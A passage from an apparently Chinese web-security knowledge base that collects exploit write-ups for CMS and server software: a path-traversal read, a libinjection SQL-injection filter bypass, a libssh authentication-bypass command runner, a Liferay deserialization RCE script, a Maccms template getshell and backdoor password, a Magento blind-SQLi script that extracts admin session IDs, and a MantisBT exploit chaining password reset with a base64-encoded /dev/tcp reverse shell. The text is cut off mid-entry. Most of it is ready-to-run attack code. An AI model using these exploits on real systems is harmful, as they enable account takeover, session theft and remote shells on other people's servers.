漏洞起始点位于/Application/Admin/Controller/TemplateController.class.php中的edit方法，该方法用作后台模板编辑，关键代码如下 我们传入的路径需要将/替换为*接着调用了read方法，跟进该方法 public function read($filename,$type=''){ return $this->get($filename,'content',$type); } 继续跟进get方法 public function get($filename,$name,$type='') { if(!isset($this->contents[$filename])) { if(!is_file($filename)) return false; $this->contents[$filename]=file_get_contents($filename); } $content=$this->contents[$filename]; $info = array( 'mtime' => filemtime($filename), 'content' => $content ); return $info[$name]; } } 该方法中返回了要读取的文件内容，可以看到在整个流程中没有对传入参数path的过滤，导致我们可以跨目录读文件，下面来验证一下，尝试读取一下跟目录index.php文件，测试链接如下 http://www.0-sec.org/admin.php?s=/Template/edit/path/*..*index.php 成功的读到了CMS的入口文件 参考链接 https://xz.aliyun.com/t/7844\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:09 "},"Web安全/Libinjection/Libinjection 语义分析通用绕过/Libinjection 语义分析通用绕过.html":{"url":"Web安全/Libinjection/Libinjection 语义分析通用绕过/Libinjection 语义分析通用绕过.html","title":"Libinjection 语义分析通用绕过","keywords":"","body":"Libinjection 语义分析通用绕过 一、漏洞简介 二、漏洞影响 三、复现过程 源码下载地址 https://github.com/client9/libinjection example.c #include #include #include #include \"libinjection.h\" #include \"libinjection_sqli.h\" int main(int argc, const char* argv[]) { struct libinjection_sqli_state state; int issqli; const char* input = argv[1]; size_t slen = strlen(input); /* in real-world, you would url-decode the input, etc */ libinjection_sqli_init(&state, input, slen, FLAG_NONE); issqli = libinjection_is_sqli(&state); if (issqli) { fprintf(stderr, \"sqli detected with fingerprint of '%s'\\n\", state.fingerprint); } return issqli; } $ gcc -Wall -Wextra examples.c libinjection_sqli.c $ ./a.out \"-1' and 1=1 union/* foo */select load_file('/etc/passwd')--\" sqli detected with fingerprint of 's&1UE' 首先给一个pyload # ./bin \"ad1n'-- %a%0aunion select 1,database(),user() -- \" not sqli # 测试payload 是否OK 为什么会这样呢??? 首先打开源码吧 如果对这个语义分析不太了解的吧，可以去百度上可以找到很多分析的文章这里就不过多阐述了 下图是一个运行的一个流程图 它内部分为四种模式 1. 无符号 标准SQL 模式 2. 无符号 MySQL模式 3. 单引号 标准SQL 模式 4. 单引号 MySQL 模式 5. 双引号 MySQL 模式 然后上面是一个单引号的标准SQL 的匹配他的一个核心点在于如下 函数libinjection_sqli_tokenize 作为一个转换内部字符的一个入口 int libinjection_sqli_tokenize(struct libinjection_sqli_state * sf) { pt2Function fnptr; size_t *pos = &sf->pos; stoken_t *current = sf->current; const char *s = sf->s; const size_t slen = sf->slen; if (slen == 0) { return FALSE; } ​ //初始化 st_clear(current); sf->current = current; ​ if (*pos == 0 && (sf->flags & (FLAG_QUOTE_SINGLE | FLAG_QUOTE_DOUBLE))) { *pos = parse_string_core(s, slen, 0, current, flag2delim(sf->flags), 0); printf(\"单引号双引号进入\"); sf->stats_tokens += 1; return TRUE; } ​ while (*pos type != CHAR_NULL) { sf->stats_tokens += 1; return TRUE; } } return FALSE; } 为什么# \"ad1n'-- %a%0aunion select 1,database(),user() -- \" 这么一个简单的可以绕过呢。 首先他是吧 admi' 先进入无符号的标准SQL 然后发现有一个\\' 后面就转到 单引号的标准SQL 单引号标准SQL 首先获取的admn' 然后break 继续到了下一层碰到了一个 - 那么走到parse_dash函数中 static size_t parse_dash(struct libinjection_sqli_state * sf) { const char *cs = sf->s; const size_t slen = sf->slen; size_t pos = sf->pos; ​ if (pos + 2 flags & FLAG_SQL_ANSI)) { sf->stats_comment_ddx += 1; return parse_eol_comment(sf); } else { st_assign_char(sf->current, TYPE_OPERATOR, pos, 1, '-'); return pos + 1; } } 然后当前的pos 一定是符合第一个判断条件的。继续跟踪parse_eol_comment 函数 static size_t parse_eol_comment(struct libinjection_sqli_state * sf) { const char *cs = sf->s; const size_t slen = sf->slen; size_t pos = sf->pos; const char *endpos =(const char *) memchr((const void *) (cs + pos), '\\n', slen - pos); if (endpos == NULL) { st_assign(sf->current, TYPE_COMMENT, pos, slen - pos, cs + pos); return slen; } else { st_assign(sf->current, TYPE_COMMENT, pos, (size_t)(endpos - cs) - pos, cs + pos); return (size_t)((endpos - cs) + 1); } } 这里只是判断了是否是有\\n 这个。然后就直接进入到st_assign 函数中。继续跟踪st_assign 函数 static void st_assign(stoken_t * st, const char stype,size_t pos, size_t len, const char* value) { const size_t MSIZE = LIBINJECTION_SQLI_TOKEN_SIZE; size_t last = len type = (char) stype; st->pos = pos; st->len = last; memcpy(st->val, value, last); st->val[last] = CHAR_NULL; } 当前函数也是只是赋值了一下val然后就可以做任何操作。 最后就是 admin' 转换成了S -- 因为没有查询到直接是C 最后得到的匹配规则为SC 。此匹配规则不在数据库中。完成了绕过。 附一张调试打印图 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:14 "},"Web安全/Libssh/（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞/（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞.html":{"url":"Web安全/Libssh/（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞/（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞.html","title":"（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞","keywords":"","body":"（CVE-2018-10933）Libssh 服务端权限认证绕过漏洞 一、漏洞简介 二、漏洞影响 libssh的server-side state machine 0.7.6之前版本和0.8.4 三、复现过程 CVE-2018-10933.py #!/usr/bin/env python3 import sys import paramiko import socket import logging logging.basicConfig(stream=sys.stdout, level=logging.DEBUG) bufsize = 2048 def execute(hostname, port, command): sock = socket.socket() try: sock.connect((hostname, int(port))) message = paramiko.message.Message() transport = paramiko.transport.Transport(sock) transport.start_client() message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS) transport._send_message(message) client = transport.open_session(timeout=10) client.exec_command(command) # stdin = client.makefile(\"wb\", bufsize) stdout = client.makefile(\"rb\", bufsize) stderr = client.makefile_stderr(\"rb\", bufsize) output = stdout.read() error = stderr.read() stdout.close() stderr.close() return (output+error).decode() except paramiko.SSHException as e: logging.exception(e) logging.debug(\"TCPForwarding disabled on remote server can't connect. Not Vulnerable\") except socket.error: logging.debug(\"Unable to connect.\") return None if __name__ == '__main__': print(execute(sys.argv[1], sys.argv[2], sys.argv[3])) 使用python3执行，即可在目标服务器上执行任意命令： Libssh服务端权限认证绕过漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/libssh/CVE-2018-10933/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:16 "},"Web安全/Liferay Portal/（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞/（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞.html":{"url":"Web安全/Liferay Portal/（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞/（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞.html","title":"（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞","keywords":"","body":"（CVE-2020-7961）Liferay Portal Json Web Service 反序列化漏洞 一、漏洞简介 二、漏洞影响 Liferay Portal 6.1.XLiferay Portal 6.2.XLiferay Portal 7.0.XLiferay Portal 7.1.XLiferay Portal 7.2.X 三、复现过程 环境搭建 https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 下载带tomcat的集成版，接下来就可以运行了，安装过程一路默认配置即可LiferayPortalJsonWebService反序列化漏洞/media/rId25.png)LiferayPortalJsonWebService反序列化漏洞/media/rId26.png) 漏洞复现 poc POST /api/jsonws/invoke HTTP/1.1 Host: www.0-sec.org:8080 Content-Length: 2335 Content-Type: application/x-www-form-urlencoded Connection: close cmd={\"/expandocolumn/add-column\":{}}&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:aced000573720028636f6d2e6d6368616e67652e76322e633370302e506f6f6c4261636b656444617461536f75726365de22cd6cc7ff7fa802000078720035636f6d2e6d6368616e67652e76322e633370302e696d706c2e4162737472616374506f6f6c4261636b656444617461536f75726365000000000000000103000078720031636f6d2e6d6368616e67652e76322e633370302e696d706c2e506f6f6c4261636b656444617461536f757263654261736500000000000000010300084900106e756d48656c706572546872656164734c0018636f6e6e656374696f6e506f6f6c44617461536f757263657400244c6a617661782f73716c2f436f6e6e656374696f6e506f6f6c44617461536f757263653b4c000e64617461536f757263654e616d657400124c6a6176612f6c616e672f537472696e673b4c000a657874656e73696f6e7374000f4c6a6176612f7574696c2f4d61703b4c0014666163746f7279436c6173734c6f636174696f6e71007e00044c000d6964656e74697479546f6b656e71007e00044c00037063737400224c6a6176612f6265616e732f50726f70657274794368616e6765537570706f72743b4c00037663737400224c6a6176612f6265616e732f5665746f61626c654368616e6765537570706f72743b7870770200017372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e000a4c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f727971007e00044c0014636c617373466163746f72794c6f636174696f6e71007e00044c0009636c6173734e616d6571007e00047870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383938392f7400076578706c6f697470707070770400000000787702000178;\"} 本地起http server 挂载Exploit.class字节码文件LiferayPortalJsonWebService反序列化漏洞/media/rId28.png)ysoserial c3p0生成： java -jar ysoserial.jar C3P0 \"http://192.168.3.199/:Exploit\" > test1.ser 然后用以下脚本转为16进制： import java.io.*; public class poc { public String encodeHex(InputStream fi) throws IOException { int size; String hexStr=\"\"; while ((size=fi.read())!=-1){ String byteChar = Integer.toHexString(size); if(byteChar.length()或者用mashalsec直接生成16进制paylaod：LiferayPortalJsonWebService反序列化漏洞/media/rId29.png)LiferayPortalJsonWebService反序列化漏洞/media/rId30.gif) poc poc.py ''' Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1 POC author: mzero Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research Usage: python poc.py -h Gadget used: C3P0WrapperConnPool Installation: pip install requests pip install bs4 Create file LifExp.java with example content: public class LifExp { static { try { String[] cmd = {\"cmd.exe\", \"/c\", \"calc.exe\"}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } } javac LifExp.java Place poc.py and LifExp.class in the same directory. ''' import requests import threading import time import sys import argparse import binascii from bs4 import BeautifulSoup from datetime import datetime from http.server import BaseHTTPRequestHandler,HTTPServer #import http.server from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # SET proxy PROXIES = {} #PROXIES = {\"http\":\"http://127.0.0.1:9090\"} class HttpHandler(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header('Content-type','application/java-vm') self.end_headers() f = open(\"LifExp.class\", \"rb\") self.wfile.write(f.read()) f.close() return def log(level, msg): prefix = \"[#] \" if level == \"error\": prefix = \"[!] \" d = datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\") temp = \"{} [{}] {}\".format(prefix, d, msg) print(temp) def find_href(body): soup = BeautifulSoup(body, \"html.parser\") return soup.find_all('a', href=True) def find_class(body, clazz): soup = BeautifulSoup(body, \"html.parser\") return soup.findAll(\"div\", {\"class\": clazz}) def find_id(body): soup = BeautifulSoup(body, \"html.parser\") return soup.findAll(\"form\", {\"id\": \"execute\"}) def get_param(div): param = \"\" param_type = \"\" p_name = div.find(\"span\", {\"class\": \"lfr-api-param-name\"}) p_type = div.find(\"span\", {\"class\": \"lfr-api-param-type\"}) if p_name: param = p_name.text.strip() if p_type: param_type = p_type.text.strip() return (param, param_type) def _do_get(url): resp = requests.get(url, proxies=PROXIES, verify=False) return resp def do_get(host, path): url = \"{}/{}\".format(host, path) resp = _do_get(url) return resp def _do_post(url, data): resp = requests.post(url, proxies=PROXIES, verify=False, data=data) return resp def do_post(host, path, data): url = \"{}/{}\".format(host, path) resp = _do_post(url, data) return resp def find_endpoints(host, path): result = [] resp = do_get(host, path) links = find_href(resp.text) for link in links: if \"java.lang.Object\" in link['href']: result.append(link['href']) return result def find_parameters(body): div_params = find_class(body, \"lfr-api-param\") params = [] for d in div_params: params.append(get_param(d)) return params def find_url(body): form = find_id(body)[0] return form['action'] def set_params(params, payload, payload_type): result = {} for param in params: p_name, p_type = param if p_type == \"java.lang.Object\": result[p_name+\":\"+payload_type] = payload result[p_name] = \"1\" return result def pad(data, length): return data+\"\\x20\"*(length-len(data)) def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE): p = set_params(params, PAYLOAD, PAYLOAD_TYPE) resp = do_post(host, api_url, p) banner = \"\"\"POC author: mzero\\r\\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research\"\"\" def main(): print(banner) parser = argparse.ArgumentParser() parser.add_argument(\"-t\", \"--target-host\", dest=\"target\", help=\"target host:port\", required=True) parser.add_argument(\"-u\", \"--api-url\", dest=\"api_url\", help=\"path to jsonws. Default: /api/jsonws\", default=\"api/jsonws\") parser.add_argument(\"-p\", \"--bind-port\", dest=\"bind_port\", help=\"HTTP server bind port. Default 9091\", default=9091) parser.add_argument(\"-l\", \"--bind-ip\", dest=\"bind_ip\", help=\"HTTP server bind IP. Default 127.0.0.1. It can't be 0.0.0.0\", default=\"127.0.0.1\") args = parser.parse_args() bind_port = int(args.bind_port) bind_ip = args.bind_ip target_ip = args.target api_url = args.api_url endpoints = [] vuln_endpoints = [] PAYLOAD_TYPE = \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" PAYLOAD_PREFIX = \"\"\"{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8\"\"\" PAYLOAD_SUFIX = \"\"\"740003466f6f;\"}\"\"\" INTERNAL = pad(\"http://{}:{}/\".format(bind_ip, bind_port), 200) INTERNALB = INTERNAL.encode('utf-8') INTERNALHEX = binascii.hexlify(INTERNALB) PAYLOAD = PAYLOAD_PREFIX+INTERNALHEX.hex()+PAYLOAD_SUFIX try: log(\"info\", \"Looking for vulnerable endpoints: {}/{}\".format(target_ip, api_url)) endpoints = find_endpoints(target_ip, api_url) if not endpoints: log(\"info\", \"Vulnerable endpoints not found!\") sys.exit(1) except Exception as ex: log(\"error\", \"An error occured:\") print(ex) sys.exit(1) try: server = HTTPServer((bind_ip, bind_port), HttpHandler) log(\"info\", \"Started HTTP server on {}:{}\".format(bind_ip, bind_port)) th = threading.Thread(target=server.serve_forever) th.daemon=True th.start() for e in endpoints: resp = do_get(target_ip, e) params = find_parameters(resp.text) url_temp = find_url(resp.text) vuln_endpoints.append((url_temp, params)) for endpoint in vuln_endpoints: log(\"info\", \"Probably vulnerable endpoint {}.\".format(endpoint[0])) op = raw_input(\"Do you want to test it? Y/N: \") if op.lower() == \"y\": exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE) log(\"info\", \"CTRL+C to exit :)\") while True: time.sleep(1) except KeyboardInterrupt: log(\"info\", \"Shutting down...\") server.socket.close() except Exception as ex: log(\"error\", \"An error occured:\") print(ex) sys.exit(1) if __name__ == \"__main__\": main() LifExp.java public class LifExp { static { try { String[] cmd = {\"cmd.exe\", \"/c\", \"calc.exe\"}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } } 参考链接 https://www.cnblogs.com/tr1ple/p/12608731.html\\#NmdGyEkb Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:18 "},"Web安全/Maccms/（CVE-2019-9829）Maccms背景任意文件写入getshell/（CVE-2019-9829）Maccms背景任意文件写入getshell.html":{"url":"Web安全/Maccms/（CVE-2019-9829）Maccms背景任意文件写入getshell/（CVE-2019-9829）Maccms背景任意文件写入getshell.html","title":"（CVE-2019-9829）Maccms背景任意文件写入getshell","keywords":"","body":"（CVE-2019-9829）Maccms背景任意文件写入getshell 一、漏洞简介 二、漏洞影响 v10 三、复现过程 登录到后台，单击基本->类别管理；您可以看到用于每个类别的类别页面模板。您会看到这里使用的模板是/art/type.html Maccms背景任意文件写入getshell/media/rId24.png) 在后台，您可以编辑模板：单击模板-\"模板管理\"，转到./template/default_pc/html/art的模板管理区域，单击\"编辑\"， Maccms背景任意文件写入getshell/media/rId25.png) 输入php代码。 Maccms背景任意文件写入getshell/media/rId26.png) 访问 index.php/art/type/id/5.html PHP代码成功执行。 Maccms背景任意文件写入getshell/media/rId27.png) 原理分析 该程序最初旨在禁止将模板更改为PHP文件： Maccms背景任意文件写入getshell/media/rId29.png) 但是，在渲染模板时，该程序会将模板文件写入缓存文件，然后将其包含在\" include\"中，因此，禁止将模板更改为php文件后，仍然可以执行代码。 Maccms背景任意文件写入getshell/media/rId30.png) Maccms背景任意文件写入getshell/media/rId31.png) image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:22 "},"Web安全/Maccms/Maccms后门/Maccms后门.html":{"url":"Web安全/Maccms/Maccms后门/Maccms后门.html","title":"Maccms后门","keywords":"","body":"Maccms后门 一、漏洞简介 有人假冒苹果cms官网，发布带有后门的程序。 二、漏洞影响 version v10 三、复现过程 后门文件路径 maccms10\\extend\\upyun\\src\\Upyun\\Api\\Format.php maccms10\\extend\\Qcloud\\Sms\\Sms.php 密码 WorldFilledWithLove 后门样本 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:22 "},"Web安全/Magento/Magento 2.2 SQL注入漏洞/Magento 2.2 SQL注入漏洞.html":{"url":"Web安全/Magento/Magento 2.2 SQL注入漏洞/Magento 2.2 SQL注入漏洞.html","title":"Magento 2.2 SQL注入漏洞","keywords":"","body":"Magento 2.2 SQL注入漏洞 一、漏洞简介 二、漏洞影响 Magento 2.2 三、复现过程 http://www.0-sec.org:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+- http://www.0-sec.org:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+- 可见，在执行))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -和))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -时，返回的HTTP状态码不同： 通过改变OR的条件，即可实现SQL BOOL型盲注。 利用POC，可以读取管理员的session： #!/usr/bin/env python3 # Magento 2.2.0 1 def test_error(self, condition): \"\"\"Runs a test. An invalid condition results in an SQL error. \"\"\" payload = '))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE %s) -- -' % condition r = self.s.get( self.URL + '/catalog/product_frontend_action/synchronize', params={ 'type_id': 'recently_products', 'ids[0][added_at]': '', 'ids[0][product_id][from]': '?', 'ids[0][product_id][to]': payload } ) if r.status_code not in (200, 400): raise ExploitError( 'SQL injection does not yield a correct HTTP response' ) return r.status_code == 400 def word(self, name, sql, size=None, charset=None): \"\"\"Dichotomically obtains a value. \"\"\" pattern = 'LOCATE(SUBSTR((%s),%d,1),BINARY %s)=0' full = '' check = False if size is None: # Yeah whatever size_size = self.word( name, 'LENGTH(LENGTH(%s))' % sql, size=1, charset=string.digits ) size = self.word( name, 'LENGTH(%s)' % sql, size=int(size_size), charset=string.digits ) size = int(size) print(\"%s: %s\" % (name, full), end='\\r') for p in range(size): c = charset while len(c) > 1: middle = len(c) // 2 h0, h1 = c[:middle], c[middle:] condition = pattern % (sql, p+1, self.encode(h0)) c = h1 if self.test(condition) else h0 full += c print(\"%s: %s\" % (name, full), end='\\r') print(' ' * len(\"%s: %s\" % (name, full)), end='\\r') return full def get_most_recent_session(self): \"\"\"Grabs the last created session. We don't need special privileges aside from creating a product so any session should do. Otherwise, the process can be improved by grabbing each session one by one and trying to reach the backend. \"\"\" # This is the default admin session timeout session_timeout = 900 query = ( 'SELECT %%s FROM admin_user_session ' 'WHERE TIMESTAMPDIFF(SECOND, updated_at, NOW()) BETWEEN 0 AND %d ' 'ORDER BY created_at DESC, updated_at DESC LIMIT 1' ) % session_timeout # Check if a session is available available = not self.test('(%s)=0' % (query % 'COUNT(*)')) if not available: raise ExploitError('No session is available') print('An admin session is available !') # Fetch it sid = self.word( 'Session ID', query % 'session_id', charset=string.ascii_lowercase + string.digits, size=26 ) print('Session ID: %s' % sid) return sid run(sys.argv[1]) 参考链接 https://vulhub.org/\\#/environments/magento/2.2-sqli/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:25 "},"Web安全/MantisBT/（CVE-2017-7615）MantisBT 任意密码重置漏洞/（CVE-2017-7615）MantisBT 任意密码重置漏洞.html":{"url":"Web安全/MantisBT/（CVE-2017-7615）MantisBT 任意密码重置漏洞/（CVE-2017-7615）MantisBT 任意密码重置漏洞.html","title":"（CVE-2017-7615）MantisBT 任意密码重置漏洞","keywords":"","body":"（CVE-2017-7615）MantisBT 任意密码重置漏洞 一、漏洞简介 攻击者可通过向verify.php文件传递空的confirm_hash值利用该漏洞重置任意密码，获取管理员访问权限。 二、漏洞影响 MantisBT2.3.0及之前的版本 三、复现过程 poc CVE-2017-7615.py # Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated) # Date: 2020-09-17 # Vulnerability Discovery: hyp3rlinx, permanull # Exploit Author: Nikolas Geiselman # Vendor Homepage: https://mantisbt.org/ # Software Link: https://mantisbt.org/download.php # Version: 1.3.0/2.3.0 # Tested on: Ubuntu 16.04/19.10/20.04 # CVE : CVE-2017-7615, CVE-2019-15715 # References: # https://mantisbt.org/bugs/view.php?id=26091 # https://www.exploit-db.com/exploits/41890 ''' This exploit chains together two CVE's to achieve unauthenticated remote code execution. The first portion of this exploit resets the Administrator password (CVE-2017-7615) discovered by John Page a.k.a hyp3rlinx, this portion was modified from the original https://www.exploit-db.com/exploits/41890. The second portion of this exploit takes advantage of a command injection vulnerability (CVE-2019-15715) discovered by 'permanull' (see references). Usage: Set netcat listener on port 4444 Send exploit with \"python exploit.py\" Example output: kali@kali:~/Desktop$ python exploit.py Successfully hijacked account! Successfully logged in! Triggering reverse shell Cleaning up Deleting the dot_tool config. Deleting the relationship_graph_enable config. Successfully cleaned up kali@kali:~/Desktop$ nc -nvlp 4444 listening on [any] 4444 ... connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978 bash: cannot set terminal process group (835): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) ''' import requests from urllib import quote_plus from base64 import b64encode from re import split class exploit(): def __init__(self): self.s = requests.Session() self.headers = dict() # Initialize the headers dictionary self.RHOST = \"192.168.116.151\" # Victim IP self.RPORT = \"80\" # Victim port self.LHOST = \"192.168.116.135\" # Attacker IP self.LPORT = \"4444\" # Attacker Port self.verify_user_id = \"1\" # User id for the target account self.realname = \"administrator\" # Username to hijack self.passwd = \"password\" # New password after account hijack self.mantisLoc = \"/mantisbt-2.3.0\" # Location of mantis in URL self.ReverseShell = \"echo \" + b64encode( \"bash -i >& /dev/tcp/\" + self.LHOST + \"/\" + self.LPORT + \" 0>&1\") + \" | base64 -d | /bin/bash\" # Reverse shell payload def reset_login(self): # Request # 1: Grab the account update token url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&confirm_hash=' r = self.s.get(url=url, headers=self.headers) if r.status_code == 404: print \"ERROR: Unable to access password reset page\" exit() account_update_token = r.text.split('name=\"account_update_token\" value=')[1].split('\"')[1] # Request # 2: Reset the account password url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/account_update.php' data = \"account_update_token=\" + account_update_token + \"&password=\" + self.passwd + \"&verify_user_id=\" + self.verify_user_id + \"&realname=\" + self.realname + \"&password_confirm=\" + self.passwd self.headers.update({'Content-Type': 'application/x-www-form-urlencoded'}) r = self.s.post(url=url, headers=self.headers, data=data) if r.status_code == 200: print \"Successfully hijacked account!\" def login(self): data = \"return=index.php&username=\" + self.realname + \"&password=\" + self.passwd + \"&secure_session=on\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/login.php' r = self.s.post(url=url, headers=self.headers, data=data) if \"login_page.php\" not in r.url: print \"Successfully logged in!\" def CreateConfigOption(self, option, value): # Get adm_config_set_token url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/adm_config_report.php' r = self.s.get(url=url, headers=self.headers) adm_config_set_token = r.text.split('name=\"adm_config_set_token\" value=')[1].split('\"')[1] # Create config data = \"adm_config_set_token=\" + adm_config_set_token + \"&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=\" + option + \"&original_config_option=&type=0&value=\" + quote_plus( value) + \"&action=create&config_set=Create+Configuration+Option\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/adm_config_set.php' r = self.s.post(url=url, headers=self.headers, data=data) def TriggerExploit(self): print \"Triggering reverse shell\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php' try: r = self.s.get(url=url, headers=self.headers, timeout=3) except: pass def Cleanup(self): # Delete the config settings that were created to send the reverse shell print \"Cleaning up\" cleaned_up = False cleanup = requests.Session() CleanupHeaders = dict() CleanupHeaders.update({'Content-Type': 'application/x-www-form-urlencoded'}) data = \"return=index.php&username=\" + self.realname + \"&password=\" + self.passwd + \"&secure_session=on\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/login.php' r = cleanup.post(url=url, headers=CleanupHeaders, data=data) ConfigsToCleanup = ['dot_tool', 'relationship_graph_enable'] for config in ConfigsToCleanup: # Get adm_config_delete_token url = \"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_report.php\" r = cleanup.get(url=url, headers=self.headers) test = split('', r.text) # First element of the response list is garbage, delete it del test[0] cleanup_dict = dict() for i in range(len(test)): if config in test[i]: cleanup_dict.update({'config_option': config}) cleanup_dict.update({'adm_config_delete_token': test[i].split('name=\"adm_config_delete_token\" value=')[1].split('\"')[1]}) cleanup_dict.update({'user_id': test[i].split('name=\"user_id\" value=')[1].split('\"')[1]}) cleanup_dict.update({'project_id': test[i].split('name=\"project_id\" value=')[1].split('\"')[1]}) # Delete the config print \"Deleting the \" + config + \" config.\" url = \"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_delete.php\" data = \"adm_config_delete_token=\" + cleanup_dict['adm_config_delete_token'] + \"&user_id=\" + cleanup_dict[ 'user_id'] + \"&project_id=\" + cleanup_dict['project_id'] + \"&config_option=\" + cleanup_dict[ 'config_option'] + \"&_confirmed=1\" r = cleanup.post(url=url, headers=CleanupHeaders, data=data) # Confirm if actually cleaned up r = cleanup.get(url=\"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_report.php\", headers=CleanupHeaders, verify=False) if config in r.text: cleaned_up = False else: cleaned_up = True if cleaned_up == True: print \"Successfully cleaned up\" else: print \"Unable to clean up configs\" exploit = exploit() exploit.reset_login() exploit.login() exploit.CreateConfigOption(option=\"relationship_graph_enable\", value=\"1\") exploit.CreateConfigOption(option=\"dot_tool\", value=exploit.ReverseShell + ';') exploit.TriggerExploit() exploit.Cleanup() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:26 "},"Web安全/MantisBT/（CVE-2019-15715）MantisBT 远程命令执行漏洞/（CVE-2019-15715）MantisBT 远程命令执行漏洞.html":{"url":"Web安全/MantisBT/（CVE-2019-15715）MantisBT 